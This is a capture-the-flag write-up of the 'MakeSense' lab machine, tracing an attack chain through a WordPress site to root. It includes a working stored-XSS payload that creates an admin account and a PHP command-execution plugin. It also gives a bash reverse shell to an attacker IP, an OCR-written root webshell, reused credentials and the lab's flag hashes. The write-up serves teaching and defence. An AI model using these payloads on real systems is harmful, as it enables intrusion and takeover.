

### Machine: MAKESENSE

#### Level: Medium

#### OS: Linux

add the ip to hosts 

```bash
echo "10.10.10.10     makesense.htb" | sudo tee -a /etc/hosts
```

## Attack Chain Summary

```
Web Recon → Stored XSS → Admin Creation → Plugin RCE → www-data Shell 
↓
wp-config.php Credentials → SSH as walter → Port Forwarding 
↓
OCR4 Service Exploit → PHP Webshell → Root Access → Flags
```

---

## Phase 1: Reconnaissance

### Nmap Scan

```bash
nmap -p- -sV -sC 10.129.38.xxx -oN nmap_all.txt
```

**Open Ports:**

- `22/tcp` - OpenSSH 9.6p1

- `443/tcp` - Apache 2.4.58, WordPress 7.0

- `8001/tcp` - Internal service (not externally accessible)
  
  ### Hosts File Setup
  
  ```bash
  echo "10.129.38.xxx makesense.htb www.makesense.htb" | sudo tee -a /etc/hosts
  ```
  
  **Critical Note:** The application's JavaScript hardcodes `https://makesense.htb` as the AJAX endpoint. Browsing by IP causes CORS issues and silent `fetch()` failures. Always use the hostname.
  
  ### WordPress Enumeration
  
  ```bash
  wpscan --url https://makesense.htb --disable-tls-checks --api-token <TOKEN> -e vt,vp,u
  ```
  
  **Findings:**

- WordPress 7.0

- Custom theme: `webagency` v1.0

- XML-RPC enabled at `/xmlrpc.php`

- Users: `admin`, `walter`, `jake`

---

## Phase 2: Stored XSS → Admin Creation

### Discovering the Vulnerability

The WebAgency theme features a voice recording widget that:

1. Records audio via Web Audio API

2. Transcribes using Transformers.js (`Xenova/whisper-tiny.en`)

3. Encrypts transcription with AES-GCM

4. Sends encrypted payload to WordPress
   
   ### The Hardcoded Encryption Key
   
   `/wp-content/themes/webagency/assets/js/whisper/whisper-wrapper.js`:
   
   ```javascript
   // Symmetric encryption key (must match server-side)
   const ENCRYPTION_KEY = 'bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI';
   ```
   
   This key is shipped to every browser, making it effectively public.
   
   ### The XSS Enabler: Symbol Mapping
   
   The application maps spoken words to HTML symbols:
   
   ```javascript
   applySymbolMapping(text) {
   const mappings = {
   'open bracket': '<',
   'close bracket': '>',
   'slash': '/',
   'quote': "'",
   'double quote': '"',
   'open paren': '(',
   'close paren': ')',
   'equals': '='
   };
   }
   ```
   
   This design allows spoken text to become literal HTML/JavaScript, creating a stored-XSS vector.
   
   ### Forging the XSS Payload
   
   All payloads executed in browser DevTools Console on `https://makesense.htb/`:
   
   #### Step 1: Obtain a Valid post_id
   
   ```javascript
   (async () => {
   const blob = new Blob([new Uint8Array(44)], {type: 'audio/wav'});
   const fd = new FormData();
   fd.append('action', 'save_voice_raw');
   fd.append('nonce', webagency_ajax.nonce);
   fd.append('voice_recording', blob, 'voice-message.wav');
   const res = await fetch(webagency_ajax.ajax_url, { method: 'POST', body: fd });
   const json = await res.json();
   window.__postId = json.data.post_id;
   console.log('post_id:', window.__postId);
   })();
   ```
   
   **Response:** `post_id: 69`
   
   #### Step 2: Encrypt and Submit XSS Payload
   
   ```javascript
   (async () => {
   const xss = `<script>
   fetch('/wp-admin/user-new.php', {credentials:'same-origin'}).then(r=>r.text()).then(html=>{
   const m = html.match(/name="_wpnonce_create-user" value="([a-f0-9]+)"/);
   if(!m) return;
   const nonce = m[1];
   const fd = new FormData();
   fd.append('action','createuser');
   fd.append('_wpnonce_create-user', nonce);
   fd.append('user_login','exploit');
   fd.append('email','exploit@evil.com');
   fd.append('pass1','Hack123!');
   fd.append('pass2','Hack123!');
   fd.append('role','administrator');
   fetch('/wp-admin/user-new.php', {method:'POST', body:fd, credentials:'same-origin'});
   });
   </script>`;
   const payload = { transcription: xss, summary: xss };
   const encrypted = await window.whisperTranscriber.encryptPayload(payload);
   const fd2 = new FormData();
   fd2.append('action', 'save_voice_results');
   fd2.append('nonce', webagency_ajax.nonce);
   fd2.append('post_id', window.__postId);
   fd2.append('encrypted_payload', encrypted);
   const res2 = await fetch(webagency_ajax.ajax_url, { method: 'POST', body: fd2 });
   console.log(await res2.json());
   })();
   ```
   
   **Response:** `{"success":true,"data":{"message":"Results saved successfully!","post_id":69}}`
   
   ### Verifying Admin Creation
   
   ```bash
   curl -sk -X POST 'https://makesense.htb/xmlrpc.php' \
   -d '<?xml version="1.0"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>exploit</string></value></param><param><value><string>Hack123!</string></value></param></params></methodCall>'
   ```
   
   **Response:** XML with `<isAdmin>1</isAdmin>` confirming admin privileges.

---

## Phase 3: WordPress RCE

### Creating the Malicious Plugin

```bash
mkdir -p /tmp/plugin && cd /tmp/plugin
cat > exploit-plugin.php << 'EOF'
<?php
/**
 * Plugin Name: Exploit Plugin
 * Version: 1.0
 */
if (isset($_GET['cmd'])) {
 system($_GET['cmd']);
}
EOF
zip exploit-plugin.zip exploit-plugin.php
```

### Upload and Activate

1. Login to WordPress admin (`exploit` / `Hack123!`)

2. Navigate to **Plugins → Add New → Upload Plugin**

3. Upload `exploit-plugin.zip`

4. Click **Install Now** → **Activate Plugin**
   
   ### Verify RCE
   
   ```bash
   curl -sk 'https://makesense.htb/wp-content/plugins/exploit-plugin/exploit-plugin.php?cmd=id'
   ```
   
   **Output:** `uid=33(www-data) gid=33(www-data) groups=33(www-data)`
   
   ### Reverse Shell
   
   ```bash
   # Listener
   nc -lvnp 4444
   # Trigger (from another terminal)
   curl -sk -G 'https://makesense.htb/wp-content/plugins/exploit-plugin/exploit-plugin.php' \
   --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/10.10.15.xxx/4444 0>&1"'
   ```
   
   **Result:** Interactive `www-data` shell.

---

## Phase 4: Credential Discovery

### Reading wp-config.php

```bash
cat /var/www/html/wp-config.php | grep -E "DB_USER|DB_PASSWORD"
```

**Output:**

```php
define( 'DB_USER', 'walter' );
define( 'DB_PASSWORD', 'JbhHDAEgXvri3!' );
```

**Key Insight:** While the site uses SQLite (not MySQL), these credentials are reused for system authentication.
---

## Phase 5: SSH Access as walter

```bash
ssh walter@10.129.38.xxx
# Password: JbhHDAEgXvri3!
```

**Verification:**

```bash
walter@makesense:~$ whoami
walter
walter@makesense:~$ id
uid=1000(walter) gid=1000(walter) groups=1000(walter)
walter@makesense:~$ cat user.txt
7fef3198f825bc6d9d66541cd768b918
```

**User Flag:** `7fef3198f825bc6d9d66541cd768b918`
---

## Phase 6: Discovering the Internal Service

### Service Discovery

From the walter shell:

```bash
curl http://localhost:8001
# Authentication required.
```

The service runs on `127.0.0.1:8001` with HTTP Basic Auth. Later investigation reveals it's OCR4 - a handwriting recognition service running as **root**.

### Port Forwarding

```bash
ssh -L 8001:localhost:8001 walter@10.129.38.xxx
# Keep this terminal open
```

Now `http://localhost:8001` on Kali reaches the internal service.
---

## Phase 7: OCR Exploit (Privilege Escalation)

### Creating the PHP PNG

```python
from PIL import Image, ImageDraw, ImageFont
import base64
img = Image.new('RGB', (700, 60), 'white')
d = ImageDraw.Draw(img)
try:
 font = ImageFont.truetype('/usr/share/fonts/truetype/dejavu/DejaVuSansMono.ttf', 18)
except:
 font = ImageFont.load_default()
d.text((5, 20), '<?php system($_GET["c"]); ?>', fill='black', font=font)
img.save('/tmp/shell.png')
with open('/tmp/shell.png', 'rb') as f:
 b64 = base64.b64encode(f.read()).decode()
 print(b64)
```

### Processing the Image

```bash
# Generate base64
python3 /tmp/exploit.py > /tmp/shell.b64
# Send to OCR and capture OCR_ID
OCR_ID=$(curl -s -c /tmp/jar -b /tmp/jar -X POST http://localhost:8001/ \
 -u 'walter:JbhHDAEgXvri3!' \
 --data-urlencode "canvas_image=data:image/png;base64,$(cat /tmp/shell.b64)" | \
 grep -oP 'ocr_id" value="\K[^"]+')
echo "OCR_ID: $OCR_ID"
```

**Result:** `ocr_6a497298785406.41816260`

### Saving as PHP Webshell

```bash
curl -s -b /tmp/jar -X POST http://localhost:8001/ \
 -u 'walter:JbhHDAEgXvri3!' \
 --data "ocr_id=ocr_6a497298785406.41816260&filename=shell.php&save_output=1"
```

### Executing Commands as Root

```bash
# Verify root access
curl -s 'http://localhost:8001/saved/shell.php?c=id' \
 -u 'walter:JbhHDAEgXvri3!'
# Output: uid=0(root) gid=0(root) groups=0(root)
# Get root flag
curl -s 'http://localhost:8001/saved/shell.php?c=cat%20/root/root.txt' \
 -u 'walter:JbhHDAEgXvri3!'
```

**Root Flag:** `257458cfe621d9251d1220044598f1c5`
---

## Flags Summary

| Flag     | Hash                               |
| -------- | ---------------------------------- |
| **User** | `7fef3198f825bc6d9d66541cd768b918` |
| **Root** | `257458cfe621d9251d1220044598f1c5` |

---

## Key Security Lessons

### 1. Client-Side Encryption is Not Security

Hardcoded keys in JavaScript provide zero protection. The encryption in this box only obscured the payload, not authenticated it.

### 2. XSS Bypasses HttpOnly Cookies

Using `fetch()` with `credentials: 'same-origin'` executes requests in the user's context. This approach sidesteps `HttpOnly` cookie protections entirely.

### 3. Credential Reuse is Dangerous

The same password appeared in both `wp-config.php` (for a dummy MySQL connection) and the `walter` system account - a critical security failure.

### 4. OCR as Attack Surface

Handwriting recognition services can be abused to write arbitrary files when both the output filename and recognized content are attacker-controlled.

### 5. Internal Services Still Need Protection

Just because a service isn't externally accessible doesn't mean it's safe. The OCR service ran as root and allowed file writes without proper validation.

### 6. Font Selection Matters

Tesseract's recognition accuracy depends on font choice - DejaVuSansMono at 18pt provided reliable results.
---

## Tools Used

- **Nmap** - Port scanning
- **WPScan** - WordPress enumeration
- **Burp Suite** - Request interception (optional)
- **Python PIL** - Image generation for OCR exploit
- **curl** - HTTP requests and webshell interaction
- **ssh** - Remote access and port forwarding

---

## Defensive Recommendations

1. **Never hardcode crypto keys** - Use proper key management
2. **Validate all user input** - Even processed voice transcriptions
3. **Separate credentials** - Use unique passwords for each service
4. **Run services with least privilege** - OCR service shouldn't run as root
5. **Sanitize filenames** - Restrict file types and validate paths
6. **Implement proper output encoding** - Prevent XSS in UI components
7. **Restrict internal services** - Add proper authentication and authorization

---

## Conclusion

HTB MakeSense demonstrates how a chain of seemingly minor vulnerabilities can lead to complete system compromise:

1. A hardcoded encryption key enables XSS
2. XSS creates an admin user
3. Admin access allows plugin upload
4. Plugin RCE exposes credentials
5. Credential reuse provides SSH access
6. Internal service exploitation gives root
   This progression shows the importance of defense-in-depth and the cascading effects of security failures.

---
